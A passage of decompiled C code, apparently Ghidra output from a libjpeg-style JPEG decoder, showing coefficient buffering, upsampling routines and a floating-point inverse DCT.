          piVar4 = (int *)(iVar1 + 0x20 + iVar8 * 4);
          for (iVar6 = 0; iVar6 < *(int *)(iVar2 + 0x34); iVar6 = iVar6 + 1) {
            *piVar4 = iVar7;
            iVar7 = iVar7 + 0x80;
            iVar8 = iVar8 + 1;
            piVar4 = piVar4 + 1;
          }
        }
        local_20 = local_20 + 1;
        local_28 = local_28 + 1;
      }
      iVar8 = (**(code **)(*(int *)(param_1 + 0x1bc) + 4))(param_1,iVar1 + 0x20);
      if (iVar8 == 0) {
        *(int *)(iVar1 + 0x18) = local_34;
        *(uint *)(iVar1 + 0x14) = local_3c;
        return 0;
      }
    }
    *(undefined4 *)(iVar1 + 0x14) = 0;
    local_34 = local_34 + 1;
  } while( true );
}



undefined4 FUN_00429674(int param_1,int *param_2)

{
  int iVar1;
  code *pcVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  uint uStack48;
  int local_2c;
  int iStack40;
  uint uStack36;
  int iStack32;
  undefined4 *local_18;
  int *local_14;
  int *piStack16;
  
  iVar3 = *(int *)(param_1 + 0x1ac);
  iVar1 = *(int *)(param_1 + 0x140);
  while ((*(int *)(param_1 + 0x90) < *(int *)(param_1 + 0x98) ||
         ((*(int *)(param_1 + 0x90) == *(int *)(param_1 + 0x98) &&
          (*(uint *)(param_1 + 0x94) < *(uint *)(param_1 + 0x9c) ||
           *(uint *)(param_1 + 0x94) == *(uint *)(param_1 + 0x9c)))))) {
    iVar4 = (***(code ***)(param_1 + 0x1b4))();
    if (iVar4 == 0) {
      return 0;
    }
  }
  local_2c = 0;
  local_18 = (undefined4 *)(iVar3 + 0x48);
  iVar3 = *(int *)(param_1 + 0xd8);
  local_14 = param_2;
  for (; local_2c < *(int *)(param_1 + 0x24); local_2c = local_2c + 1) {
    if (*(int *)(iVar3 + 0x30) != 0) {
      piStack16 = (int *)(**(code **)(*(int *)(param_1 + 4) + 0x20))
                                   (param_1,*local_18,
                                    *(int *)(param_1 + 0x9c) * *(int *)(iVar3 + 0xc),0,
                                    *(int *)(iVar3 + 0xc));
      if (*(uint *)(param_1 + 0x9c) < iVar1 - 1U) {
        uStack36 = *(uint *)(iVar3 + 0xc);
      }
      else {
        uStack36 = *(uint *)(iVar3 + 0x20) % *(uint *)(iVar3 + 0xc);
        if (uStack36 == 0) {
          uStack36 = *(uint *)(iVar3 + 0xc);
        }
      }
      pcVar2 = *(code **)(*(int *)(param_1 + 0x1c0) + 4 + local_2c * 4);
      iStack32 = *local_14;
      iStack40 = 0;
      if (0 < (int)uStack36) {
        do {
          iVar5 = 0;
          iVar4 = *piStack16;
          for (uStack48 = 0; uStack48 < *(uint *)(iVar3 + 0x1c); uStack48 = uStack48 + 1) {
            (*pcVar2)(param_1,iVar3,iVar4,iVar5,iStack32);
            iVar4 = iVar4 + 0x80;
            iVar5 = iVar5 + *(int *)(iVar3 + 0x24);
          }
          iStack32 = iStack32 + *(int *)(iVar3 + 0x24) * 4;
          iStack40 = iStack40 + 1;
          piStack16 = piStack16 + 1;
        } while (iStack40 < (int)uStack36);
      }
    }
    local_18 = local_18 + 1;
    local_14 = local_14 + 1;
    iVar3 = iVar3 + 0x54;
  }
  *(int *)(param_1 + 0x9c) = *(int *)(param_1 + 0x9c) + 1;
  if (*(uint *)(param_1 + 0x9c) < *(uint *)(param_1 + 0x140)) {
    return 3;
  }
  return 4;
}



undefined4 FUN_00429844(int param_1)

{
  short *psVar1;
  undefined4 uVar2;
  int *piVar3;
  int iVar4;
  int *piVar5;
  int iVar6;
  int *piVar7;
  undefined4 local_14;
  int local_10;
  
  iVar6 = *(int *)(param_1 + 0x1ac);
  local_14 = 0;
  if ((*(int *)(param_1 + 0xdc) == 0) || (*(int *)(param_1 + 0xa0) == 0)) {
    local_14 = 0;
  }
  else {
    if (*(int *)(iVar6 + 0x70) == 0) {
      uVar2 = (***(code ***)(param_1 + 4))(param_1,1,*(int *)(param_1 + 0x24) * 0x18);
      *(undefined4 *)(iVar6 + 0x70) = uVar2;
    }
    piVar7 = *(int **)(iVar6 + 0x70);
    local_10 = *(int *)(param_1 + 0xd8);
    for (iVar6 = 0; iVar6 < *(int *)(param_1 + 0x24); iVar6 = iVar6 + 1) {
      psVar1 = *(short **)(local_10 + 0x4c);
      if (psVar1 == (short *)0x0) {
        return 0;
      }
      if ((((*psVar1 == 0) || (psVar1[1] == 0)) || (psVar1[8] == 0)) ||
         (((psVar1[0x10] == 0 || (psVar1[9] == 0)) || (psVar1[2] == 0)))) {
        return 0;
      }
      piVar3 = (int *)(*(int *)(param_1 + 0xa0) + iVar6 * 0x100);
      if (*piVar3 < 0) {
        return 0;
      }
      iVar4 = 1;
      piVar5 = piVar7;
      do {
        piVar5 = piVar5 + 1;
        piVar3 = piVar3 + 1;
        *piVar5 = *piVar3;
        if (*piVar3 != 0) {
          local_14 = 1;
        }
        iVar4 = iVar4 + 1;
      } while (iVar4 < 6);
      piVar7 = piVar7 + 6;
      local_10 = local_10 + 0x54;
    }
  }
  return local_14;
}



void FUN_0042a124(int param_1,int param_2)

{
  undefined4 *puVar1;
  int iVar2;
  int iVar3;
  undefined4 uVar4;
  int *piVar5;
  int iVar6;
  int iStack28;
  int iStack24;
  undefined4 *puStack20;
  
  puVar1 = (undefined4 *)(***(code ***)(param_1 + 4))(param_1,1,0x74);
  *(undefined4 **)(param_1 + 0x1ac) = puVar1;
  *puVar1 = &LAB_004291f4;
  puVar1[2] = FUN_00429204;
  puVar1[0x1c] = 0;
  if (param_2 == 0) {
    iVar2 = (**(code **)(*(int *)(param_1 + 4) + 4))(param_1,1,0x500);
    piVar5 = puVar1 + 8;
    iVar6 = 0;
    do {
      iVar3 = iVar6 + 1;
      *piVar5 = iVar6 * 0x80 + iVar2;
      piVar5 = piVar5 + 1;
      iVar6 = iVar3;
    } while (iVar3 < 10);
    puVar1[1] = &LAB_00429480;
    puVar1[3] = FUN_00429240;
    puVar1[4] = 0;
  }
  else {
    iStack28 = 0;
    iVar6 = *(int *)(param_1 + 0xd8);
    puStack20 = puVar1 + 0x12;
    for (; iStack28 < *(int *)(param_1 + 0x24); iStack28 = iStack28 + 1) {
      iStack24 = *(int *)(iVar6 + 0xc);
      if (*(int *)(param_1 + 0xdc) != 0) {
        iStack24 = iStack24 * 3;
      }
      iVar2 = FUN_0042dbb8(*(int *)(iVar6 + 0x1c),*(int *)(iVar6 + 8));
      iVar3 = FUN_0042dbb8(*(int *)(iVar6 + 0x20),*(int *)(iVar6 + 0xc));
      uVar4 = (**(code **)(*(int *)(param_1 + 4) + 0x14))(param_1,1,1,iStack24,iVar3,iVar2);
      *puStack20 = uVar4;
      puStack20 = puStack20 + 1;
      iVar6 = iVar6 + 0x54;
    }
    puVar1[1] = FUN_00429484;
    puVar1[3] = FUN_00429674;
    puVar1[4] = puVar1 + 0x12;
  }
  return;
}



void FUN_0042a2e0(int param_1,undefined4 param_2,undefined4 param_3,int param_4,int *param_5,
                 int param_6,undefined4 param_7)

{
  int iVar1;
  uint uVar2;
  int local_10;
  undefined4 local_c;
  int local_8;
  
  iVar1 = *(int *)(param_1 + 0x1b0);
  uVar2 = param_4 - *param_5;
  if (*(uint *)(iVar1 + 0x10) < (uint)(param_4 - *param_5)) {
    uVar2 = *(uint *)(iVar1 + 0x10);
  }
  local_10 = 0;
  local_c = param_3;
  local_8 = param_1;
  (**(code **)(*(int *)(param_1 + 0x1c4) + 4))
            (param_1,param_2,param_3,uVar2,&local_10,*(undefined4 *)(iVar1 + 0xc),param_7);
  (**(code **)(*(int *)(local_8 + 0x1cc) + 4))
            (local_8,*(undefined4 *)(iVar1 + 0xc),*param_5 * 4 + param_6,local_10);
  *param_5 = *param_5 + local_10;
  return;
}



void FUN_0042a35c(int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,int *param_5,
                 undefined4 param_6,undefined4 param_7)

{
  int iVar1;
  uint uVar2;
  undefined4 uVar3;
  int iVar4;
  
  iVar1 = *(int *)(param_1 + 0x1b0);
  if (*(int *)(iVar1 + 0x18) == 0) {
    uVar3 = (**(code **)(*(int *)(param_1 + 4) + 0x1c))
                      (param_1,*(undefined4 *)(iVar1 + 8),*(undefined4 *)(iVar1 + 0x14),1,
                       *(undefined4 *)(iVar1 + 0x10));
    *(undefined4 *)(iVar1 + 0xc) = uVar3;
  }
  uVar2 = *(uint *)(iVar1 + 0x18);
  (**(code **)(*(int *)(param_1 + 0x1c4) + 4))
            (param_1,param_2,param_3,*(undefined4 *)(iVar1 + 0x10),iVar1 + 0x18,
             *(undefined4 *)(iVar1 + 0xc),param_7);
  if (uVar2 < *(uint *)(iVar1 + 0x18)) {
    iVar4 = *(uint *)(iVar1 + 0x18) - uVar2;
    (**(code **)(*(int *)(param_1 + 0x1cc) + 4))(param_1,uVar2 * 4 + *(int *)(iVar1 + 0xc),0,iVar4);
    *param_5 = *param_5 + iVar4;
  }
  uVar2 = *(uint *)(iVar1 + 0x10);
  if (uVar2 < *(uint *)(iVar1 + 0x18) || uVar2 == *(uint *)(iVar1 + 0x18)) {
    *(int *)(iVar1 + 0x14) = *(int *)(iVar1 + 0x14) + uVar2;
    *(undefined4 *)(iVar1 + 0x18) = 0;
  }
  return;
}



void FUN_0042a400(int param_1,undefined4 param_2,undefined4 param_3,int param_4,int *param_5,
                 int param_6)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  
  iVar1 = *(int *)(param_1 + 0x1b0);
  if (*(int *)(iVar1 + 0x18) == 0) {
    uVar2 = (**(code **)(*(int *)(param_1 + 4) + 0x1c))
                      (param_1,*(undefined4 *)(iVar1 + 8),*(undefined4 *)(iVar1 + 0x14),0,
                       *(undefined4 *)(iVar1 + 0x10));
    *(undefined4 *)(iVar1 + 0xc) = uVar2;
  }
  uVar4 = *(int *)(iVar1 + 0x10) - *(int *)(iVar1 + 0x18);
  if ((uint)(param_4 - *param_5) < uVar4) {
    uVar4 = param_4 - *param_5;
  }
  uVar3 = *(int *)(param_1 + 0x74) - *(int *)(iVar1 + 0x14);
  if (uVar3 < uVar4) {
    uVar4 = uVar3;
  }
  (**(code **)(*(int *)(param_1 + 0x1cc) + 4))
            (param_1,*(int *)(iVar1 + 0x18) * 4 + *(int *)(iVar1 + 0xc),*param_5 * 4 + param_6,uVar4
            );
  *param_5 = *param_5 + uVar4;
  *(int *)(iVar1 + 0x18) = *(int *)(iVar1 + 0x18) + uVar4;
  uVar4 = *(uint *)(iVar1 + 0x10);
  if (uVar4 < *(uint *)(iVar1 + 0x18) || uVar4 == *(uint *)(iVar1 + 0x18)) {
    *(int *)(iVar1 + 0x14) = *(int *)(iVar1 + 0x14) + uVar4;
    *(undefined4 *)(iVar1 + 0x18) = 0;
  }
  return;
}



void FUN_0042a498(int param_1,int param_2)

{
  undefined4 *puVar1;
  int iVar2;
  int iVar3;
  undefined4 uVar4;
  
  puVar1 = (undefined4 *)(***(code ***)(param_1 + 4))(param_1,1,0x1c);
  *(undefined4 **)(param_1 + 0x1b0) = puVar1;
  *puVar1 = &LAB_0042a238;
  puVar1[2] = 0;
  puVar1[3] = 0;
  if (*(int *)(param_1 + 0x54) != 0) {
    iVar3 = *(int *)(param_1 + 0x138);
    puVar1[4] = iVar3;
    if (param_2 == 0) {
      uVar4 = (**(code **)(*(int *)(param_1 + 4) + 8))
                        (param_1,1,*(int *)(param_1 + 0x70) * *(int *)(param_1 + 0x78),puVar1[4]);
      puVar1[3] = uVar4;
    }
    else {
      iVar2 = *(int *)(param_1 + 0x70) * *(int *)(param_1 + 0x78);
      iVar3 = FUN_0042dbb8(*(int *)(param_1 + 0x74),iVar3);
      uVar4 = (**(code **)(*(int *)(param_1 + 4) + 0x10))(param_1,1,0,puVar1[4],iVar3,iVar2);
      puVar1[2] = uVar4;
    }
  }
  return;
}



void FUN_0042a780(int param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  undefined extraout_CL;
  undefined extraout_DL;
  int iVar3;
  int iVar4;
  
  puVar1 = (undefined4 *)(***(code ***)(param_1 + 4))(param_1,1,0x54,param_3);
  *(undefined4 **)(param_1 + 0x1c0) = puVar1;
  *puVar1 = &LAB_0042a52c;
  puVar1 = puVar1 + 0xb;
  iVar3 = *(int *)(param_1 + 0xd8);
  for (iVar4 = 0; iVar4 < *(int *)(param_1 + 0x24); iVar4 = iVar4 + 1) {
    uVar2 = (***(code ***)(param_1 + 4))(param_1,1,0x100);
    *(undefined4 *)(iVar3 + 0x50) = uVar2;
    FUN_00420fb0((char)*(undefined4 *)(iVar3 + 0x50),extraout_DL,extraout_CL,
                 *(undefined4 *)(iVar3 + 0x50),0,0x100);
    *puVar1 = 0xffffffff;
    puVar1 = puVar1 + 1;
    iVar3 = iVar3 + 0x54;
  }
  return;
}



void FUN_0042a814(int param_1,int *param_2,int *param_3,int param_4,int *param_5,int param_6)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  int *local_20;
  code **local_1c;
  uint local_18;
  int local_14;
  int local_10;
  
  iVar1 = *(int *)(param_1 + 0x1c4);
  if (*(int *)(param_1 + 0x138) <= *(int *)(iVar1 + 0x5c)) {
    local_10 = 0;
    local_14 = *(int *)(param_1 + 0xd8);
    local_1c = (code **)(iVar1 + 0x34);
    local_20 = param_2;
    for (; local_10 < *(int *)(param_1 + 0x24); local_10 = local_10 + 1) {
      (**local_1c)(param_1,local_14,*param_3 * (int)local_1c[0xc] * 4 + *local_20,
                   local_10 * 4 + iVar1 + 0xc);
      local_1c = local_1c + 1;
      local_20 = local_20 + 1;
      local_14 = local_14 + 0x54;
    }
    *(undefined4 *)(iVar1 + 0x5c) = 0;
  }
  local_18 = *(int *)(param_1 + 0x138) - *(int *)(iVar1 + 0x5c);
  if (*(uint *)(iVar1 + 0x60) < local_18) {
    local_18 = *(uint *)(iVar1 + 0x60);
  }
  uVar2 = param_4 - *param_5;
  if (uVar2 < local_18) {
    local_18 = uVar2;
  }
  (**(code **)(*(int *)(param_1 + 0x1c8) + 4))
            (param_1,iVar1 + 0xc,*(int *)(iVar1 + 0x5c),local_18,*param_5 * 4 + param_6);
  *param_5 = *param_5 + local_18;
  *(int *)(iVar1 + 0x60) = *(int *)(iVar1 + 0x60) - local_18;
  iVar3 = *(int *)(iVar1 + 0x5c) + local_18;
  *(int *)(iVar1 + 0x5c) = iVar3;
  if (*(int *)(param_1 + 0x138) <= iVar3) {
    *param_3 = *param_3 + 1;
  }
  return;
}



void FUN_0042a914(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 *param_4)

{
  *param_4 = param_3;
  return;
}



void FUN_0042a920(undefined param_1,undefined param_2,undefined param_3,undefined4 *param_4)

{
  *param_4 = 0;
  return;
}



void FUN_0042a930(int param_1,int param_2,undefined4 *param_3,int *param_4)

{
  int iVar1;
  undefined uVar2;
  uint uVar3;
  undefined *puVar4;
  uint uVar5;
  uint uVar6;
  undefined *puVar7;
  undefined *puVar8;
  undefined4 *local_1c;
  int local_18;
  
  iVar1 = *param_4;
  uVar6 = (uint)*(byte *)(*(int *)(param_1 + 0x1c4) + 0x8c + *(int *)(param_2 + 4));
  uVar3 = (uint)*(byte *)(*(int *)(param_1 + 0x1c4) + 0x96 + *(int *)(param_2 + 4));
  local_1c = param_3;
  for (local_18 = 0; local_18 < *(int *)(param_1 + 0x138); local_18 = local_18 + uVar3) {
    puVar7 = (undefined *)*local_1c;
    puVar4 = *(undefined **)(iVar1 + local_18 * 4);
    puVar8 = puVar4 + *(int *)(param_1 + 0x70);
    while (puVar4 < puVar8) {
      uVar2 = *puVar7;
      puVar7 = puVar7 + 1;
      uVar5 = uVar6;
      if (uVar6 != 0) {
        do {
          *puVar4 = uVar2;
          puVar4 = puVar4 + 1;
          uVar5 = uVar5 - 1;
        } while (0 < (int)uVar5);
      }
    }
    if (1 < uVar3) {
      uVar2 = (undefined)iVar1;
      FUN_0042dbd0(uVar2,(char)local_18,uVar2,*(undefined4 *)(param_1 + 0x70),uVar3 - 1,local_18 + 1
                  );
    }
    local_1c = local_1c + 1;
  }
  return;
}



void FUN_0042a9ec(int param_1,undefined4 param_2,undefined4 *param_3,undefined4 *param_4)

{
  undefined uVar1;
  undefined *puVar2;
  undefined *puVar3;
  undefined *puVar4;
  undefined4 *local_10;
  int local_c;
  
  local_10 = (undefined4 *)*param_4;
  for (local_c = 0; local_c < *(int *)(param_1 + 0x138); local_c = local_c + 1) {
    puVar3 = (undefined *)*param_3;
    puVar2 = (undefined *)*local_10;
    puVar4 = puVar2 + *(int *)(param_1 + 0x70);
    for (; puVar2 < puVar4; puVar2 = puVar2 + 2) {
      uVar1 = *puVar3;
      puVar3 = puVar3 + 1;
      *puVar2 = uVar1;
      puVar2[1] = uVar1;
    }
    local_10 = local_10 + 1;
    param_3 = param_3 + 1;
  }
  return;
}



void FUN_0042aa48(int param_1,undefined4 param_2,undefined4 *param_3,undefined4 *param_4)

{
  undefined4 *puVar1;
  undefined uVar2;
  undefined *puVar3;
  undefined *puVar4;
  undefined *puVar5;
  undefined4 *local_18;
  undefined4 *local_14;
  int local_10;
  
  puVar1 = (undefined4 *)*param_4;
  local_18 = puVar1;
  local_14 = param_3;
  for (local_10 = 0; local_10 < *(int *)(param_1 + 0x138); local_10 = local_10 + 2) {
    puVar3 = (undefined *)*local_18;
    puVar5 = puVar3 + *(int *)(param_1 + 0x70);
    puVar4 = (undefined *)*local_14;
    for (; puVar3 < puVar5; puVar3 = puVar3 + 2) {
      uVar2 = *puVar4;
      puVar4 = puVar4 + 1;
      *puVar3 = uVar2;
      puVar3[1] = uVar2;
    }
    uVar2 = SUB41(puVar1,0);
    FUN_0042dbd0(uVar2,(char)local_10,uVar2,*(undefined4 *)(param_1 + 0x70),1,local_10 + 1);
    local_14 = local_14 + 1;
    local_18 = local_18 + 2;
  }
  return;
}



void FUN_0042aad8(int param_1,int param_2,byte **param_3,undefined4 *param_4)

{
  byte bVar1;
  byte *pbVar2;
  byte *pbVar3;
  byte *pbVar4;
  int iVar5;
  byte **local_14;
  int local_10;
  
  local_14 = (byte **)*param_4;
  for (local_10 = 0; local_10 < *(int *)(param_1 + 0x138); local_10 = local_10 + 1) {
    pbVar2 = *local_14;
    bVar1 = **param_3;
    pbVar4 = *param_3 + 1;
    *pbVar2 = bVar1;
    pbVar2[1] = (byte)((int)((uint)bVar1 * 3 + (uint)*pbVar4 + 2) >> 2);
    for (iVar5 = *(int *)(param_2 + 0x28) + -2; pbVar3 = pbVar2 + 2, iVar5 != 0; iVar5 = iVar5 + -1)
    {
      bVar1 = *pbVar4;
      *pbVar3 = (byte)((int)((uint)pbVar4[-1] + (uint)bVar1 * 3 + 1) >> 2);
      pbVar2[3] = (byte)((int)((uint)bVar1 * 3 + (uint)pbVar4[1] + 2) >> 2);
      pbVar4 = pbVar4 + 1;
      pbVar2 = pbVar3;
    }
    bVar1 = *pbVar4;
    *pbVar3 = (byte)((int)((uint)bVar1 * 3 + (uint)pbVar4[-1] + 1) >> 2);
    pbVar2[3] = bVar1;
    local_14 = local_14 + 1;
    param_3 = param_3 + 1;
  }
  return;
}



void FUN_0042ab8c(int param_1,int param_2,byte **param_3,int *param_4)

{
  byte bVar1;
  int iVar2;
  byte *pbVar3;
  undefined *puVar4;
  undefined *puVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  byte **local_30;
  int *local_2c;
  int local_24;
  int local_20;
  byte *local_14;
  
  iVar2 = *param_4;
  local_20 = 0;
  local_30 = param_3;
  while (local_20 < *(int *)(param_1 + 0x138)) {
    local_24 = 0;
    local_2c = (int *)(iVar2 + local_20 * 4);
    do {
      pbVar3 = *local_30;
      if (local_24 == 0) {
        local_14 = local_30[-1];
      }
      else {
        local_14 = local_30[1];
      }
      puVar4 = (undefined *)*local_2c;
      local_20 = local_20 + 1;
      local_2c = local_2c + 1;
      iVar7 = (uint)*pbVar3 * 3 + (uint)*local_14;
      iVar8 = (uint)pbVar3[1] * 3 + (uint)local_14[1];
      local_14 = local_14 + 2;
      pbVar3 = pbVar3 + 2;
      *puVar4 = (char)(iVar7 * 4 + 8 >> 4);
      puVar4[1] = (char)(iVar7 * 3 + iVar8 + 7 >> 4);
      for (iVar6 = *(int *)(param_2 + 0x28) + -2; puVar5 = puVar4 + 2, iVar6 != 0;
          iVar6 = iVar6 + -1) {
        bVar1 = *local_14;
        local_14 = local_14 + 1;
        iVar9 = (uint)*pbVar3 * 3 + (uint)bVar1;
        pbVar3 = pbVar3 + 1;
        *puVar5 = (char)(iVar8 * 3 + iVar7 + 8 >> 4);
        puVar4[3] = (char)(iVar8 * 3 + iVar9 + 7 >> 4);
        iVar7 = iVar8;
        iVar8 = iVar9;
        puVar4 = puVar5;
      }
      *puVar5 = (char)(iVar8 * 3 + iVar7 + 8 >> 4);
      puVar4[3] = (char)(iVar8 * 4 + 7 >> 4);
      local_24 = local_24 + 1;
    } while (local_24 < 2);
    local_30 = local_30 + 1;
  }
  return;
}



void FUN_0042ace0(int *param_1)

{
  bool bVar1;
  bool bVar2;
  undefined4 *puVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int *piVar8;
  int iVar9;
  int iStack40;
  undefined4 *puStack20;
  
  puVar3 = (undefined4 *)(**(code **)param_1[1])(param_1,1,0xa0);
  param_1[0x71] = (int)puVar3;
  *puVar3 = &LAB_0042a7fc;
  puVar3[1] = FUN_0042a814;
  puVar3[2] = 0;
  if (param_1[0x4b] != 0) {
    *(undefined4 *)(*param_1 + 0x14) = 0x19;
    (**(code **)*param_1)();
  }
  if ((param_1[0x13] == 0) || (param_1[0x4f] < 2)) {
    bVar1 = false;
  }
  else {
    bVar1 = true;
  }
  iStack40 = 0;
  iVar9 = param_1[0x36];
  puStack20 = puVar3 + 0x23;
  piVar8 = puVar3 + 0x19;
  for (; iStack40 < param_1[9]; iStack40 = iStack40 + 1) {
    iVar4 = (*(int *)(iVar9 + 8) * *(int *)(iVar9 + 0x24)) / param_1[0x4f];
    iVar5 = (*(int *)(iVar9 + 0xc) * *(int *)(iVar9 + 0x24)) / param_1[0x4f];
    iVar7 = param_1[0x4d];
    iVar6 = param_1[0x4e];
    *piVar8 = iVar5;
    bVar2 = true;
    if (*(int *)(iVar9 + 0x30) == 0) {
      piVar8[-0xc] = (int)FUN_0042a920;
      bVar2 = false;
    }
    else if ((iVar4 == iVar7) && (iVar5 == iVar6)) {
      piVar8[-0xc] = (int)FUN_0042a914;
      bVar2 = false;
    }
    else if ((iVar4 * 2 == iVar7) && (iVar5 == iVar6)) {
      if ((bVar1) && (2 < *(uint *)(iVar9 + 0x28))) {
        piVar8[-0xc] = (int)FUN_0042aad8;
      }
      else {
        piVar8[-0xc] = (int)FUN_0042a9ec;
      }
    }
    else if ((iVar4 * 2 == iVar7) && (iVar5 * 2 == iVar6)) {
      if ((bVar1) && (2 < *(uint *)(iVar9 + 0x28))) {
        piVar8[-0xc] = (int)FUN_0042ab8c;
        puVar3[2] = 1;
      }
      else {
        piVar8[-0xc] = (int)FUN_0042aa48;
      }
    }
    else if ((iVar7 % iVar4 == 0) && (iVar6 % iVar5 == 0)) {
      piVar8[-0xc] = (int)FUN_0042a930;
      *(char *)puStack20 = (char)(iVar7 / iVar4);
      *(char *)((int)puStack20 + 10) = (char)(iVar6 / iVar5);
    }
    else {
      *(undefined4 *)(*param_1 + 0x14) = 0x26;
      (**(code **)*param_1)();
    }
    if (bVar2) {
      iVar7 = param_1[0x4e];
      iVar6 = FUN_0042dbb8(param_1[0x1c],param_1[0x4d]);
      iVar7 = (**(code **)(param_1[1] + 8))(param_1,1,iVar6,iVar7);
      piVar8[-0x16] = iVar7;
    }
    piVar8 = piVar8 + 1;
    puStack20 = (undefined4 *)((int)puStack20 + 1);
    iVar9 = iVar9 + 0x54;
  }
  return;
}



void FUN_0042aef8(int param_1,int param_2,short *param_3,int param_4,int *param_5)

{
  float fVar1;
  float fVar2;
  float fVar3;
  int iVar4;
  float *pfVar5;
  float *pfVar6;
  undefined *puVar7;
  int iVar8;
  float local_154 [16];
  float local_114 [8];
  float local_f4 [8];
  float local_d4 [8];
  float local_b4 [8];
  float local_94 [8];
  float local_74 [8];
  int *local_54;
  float local_50;
  int local_4c;
  float local_48;
  float local_44;
  float local_40;
  float local_3c;
  float local_38;
  float local_34;
  float local_30;
  float local_2c;
  float local_28;
  float local_24;
  float local_20;
  float local_1c;
  float local_18;
  float local_14;
  float local_10;
  float local_c;
  float local_8;
  
  iVar8 = 8;
  pfVar6 = local_154;
  local_4c = *(int *)(param_1 + 0x144) + 0x80;
  pfVar5 = *(float **)(param_2 + 0x50);
  do {
    if ((((param_3[8] == 0) && (param_3[0x10] == 0)) && (param_3[0x18] == 0)) &&
       (((param_3[0x20] == 0 && (param_3[0x28] == 0)) &&
        ((param_3[0x30] == 0 && (param_3[0x38] == 0)))))) {
      local_50 = (float)*param_3 * *pfVar5;
      *pfVar6 = (float)*param_3 * *pfVar5;
      pfVar6[8] = local_50;
      pfVar6[0x10] = local_50;
      pfVar6[0x18] = local_50;
      pfVar6[0x20] = local_50;
      pfVar6[0x28] = local_50;
      pfVar6[0x30] = local_50;
      pfVar6[0x38] = local_50;
    }
    else {
      fVar1 = (float)*param_3 * *pfVar5 + (float)param_3[0x20] * pfVar5[0x20];
      fVar2 = (float)*param_3 * *pfVar5 - (float)param_3[0x20] * pfVar5[0x20];
      local_34 = (float)param_3[0x10] * pfVar5[0x10] + (float)param_3[0x30] * pfVar5[0x30];
      fVar3 = ((float)param_3[0x10] * pfVar5[0x10] - (float)param_3[0x30] * pfVar5[0x30]) * 1.414214
              - local_34;
      local_8 = fVar1 + local_34;
      local_14 = fVar1 - local_34;
      local_c = fVar2 + fVar3;
      local_10 = fVar2 - fVar3;
      local_48 = (float)param_3[0x28] * pfVar5[0x28] + (float)param_3[0x18] * pfVar5[0x18];
      local_3c = (float)param_3[0x28] * pfVar5[0x28] - (float)param_3[0x18] * pfVar5[0x18];
      local_40 = (float)param_3[8] * pfVar5[8] + (float)param_3[0x38] * pfVar5[0x38];
      local_44 = (float)param_3[8] * pfVar5[8] - (float)param_3[0x38] * pfVar5[0x38];
      local_24 = local_40 + local_48;
      local_2c = (local_40 - local_48) * 1.414214;
      local_38 = (local_3c + local_44) * 1.847759;
      local_28 = local_44 * 1.082392 - local_38;
      local_30 = local_3c * -2.613126 + local_38;
      local_20 = local_30 - local_24;
      local_1c = local_2c - local_20;
      local_18 = local_28 + local_1c;
      *pfVar6 = local_8 + local_24;
      pfVar6[0x38] = local_8 - local_24;
      pfVar6[8] = local_c + local_20;
      pfVar6[0x30] = local_c - local_20;
      pfVar6[0x10] = local_10 + local_1c;
      pfVar6[0x28] = local_10 - local_1c;
      pfVar6[0x20] = local_14 + local_18;
      pfVar6[0x18] = local_14 - local_18;
    }
    pfVar6 = pfVar6 + 1;
    pfVar5 = pfVar5 + 1;
    param_3 = param_3 + 1;
    iVar8 = iVar8 + -1;
  } while (0 < iVar8);
  pfVar6 = local_154;
  iVar8 = 0;
  local_54 = param_5;
  do {
    local_28 = *pfVar6 + pfVar6[4];
    puVar7 = (undefined *)(*local_54 + param_4);
    local_2c = *pfVar6 - pfVar6[4];
    local_34 = pfVar6[2] + pfVar6[6];
    local_30 = (pfVar6[2] - pfVar6[6]) * 1.414214 - local_34;
    local_8 = local_28 + local_34;
    local_14 = local_28 - local_34;
    local_c = local_2c + local_30;
    local_10 = local_2c - local_30;
    local_48 = pfVar6[5] + pfVar6[3];
    local_3c = pfVar6[5] - pfVar6[3];
    local_40 = pfVar6[1] + pfVar6[7];
    local_44 = pfVar6[1] - pfVar6[7];
    local_24 = local_40 + local_48;
    local_2c = (local_40 - local_48) * 1.414214;
    local_38 = (local_3c + local_44) * 1.847759;
    local_28 = local_44 * 1.082392 - local_38;
    local_30 = local_3c * -2.613126 + local_38;
    local_20 = local_30 - local_24;
    local_1c = local_2c - local_20;
    local_18 = local_28 + local_1c;
    iVar4 = FUN_0042101c();
    *puVar7 = *(undefined *)(local_4c + (iVar4 + 4 >> 3 & 0x3ffU));
    iVar4 = FUN_0042101c();
    puVar7[7] = *(undefined *)(local_4c + (iVar4 + 4 >> 3 & 0x3ffU));
    iVar4 = FUN_0042101c();
    puVar7[1] = *(undefined *)(local_4c + (iVar4 + 4 >> 3 & 0x3ffU));
    iVar4 = FUN_0042101c();
    puVar7[6] = *(undefined *)(local_4c + (iVar4 + 4 >> 3 & 0x3ffU));
    iVar4 = FUN_0042101c();
    puVar7[2] = *(undefined *)(local_4c + (iVar4 + 4 >> 3 & 0x3ffU));
    iVar4 = FUN_0042101c();
    puVar7[5] = *(undefined *)(local_4c + (iVar4 + 4 >> 3 & 0x3ffU));
    iVar4 = FUN_0042101c();
    puVar7[4] = *(undefined *)(local_4c + (iVar4 + 4 >> 3 & 0x3ffU));
    iVar4 = FUN_0042101c();
    pfVar6 = pfVar6 + 8;
    iVar8 = iVar8 + 1;
    puVar7[3] = *(undefined *)(local_4c + (iVar4 + 4 >> 3 & 0x3ffU));
    local_54 = local_54 + 1;
  } while (iVar8 < 8);
  return;
}



void FUN_0042bb24(int param_1,int param_2,short *param_3,int param_4,int *param_5)

{
  int *piVar1;
  undefined *puVar2;
  int iVar3;
  int iVar4;
  int local_58 [16];
  int *local_18;
  undefined local_11;
  int local_10;
  int *local_c;
  int local_8;
  
  local_10 = *(int *)(param_1 + 0x144) + 0x80;
  piVar1 = local_58;
  local_c = *(int **)(param_2 + 0x50);
  iVar3 = 8;
  do {
    if (((iVar3 != 6) && (iVar3 != 4)) && (iVar3 != 2)) {
      if (((param_3[8] == 0) && (param_3[0x18] == 0)) &&
         ((param_3[0x28] == 0 && (param_3[0x38] == 0)))) {
